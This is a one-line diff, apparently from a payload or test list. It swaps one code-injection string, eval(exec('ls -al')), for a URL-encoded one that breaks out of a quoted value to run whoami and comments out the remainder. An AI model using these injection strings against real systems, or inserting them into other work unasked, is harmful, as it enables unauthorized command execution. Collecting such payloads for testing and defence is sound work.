@@ -1,1 +1,1 @@
-eval(exec('ls -al'))
+";%20echo%20exec('whoami');%20//
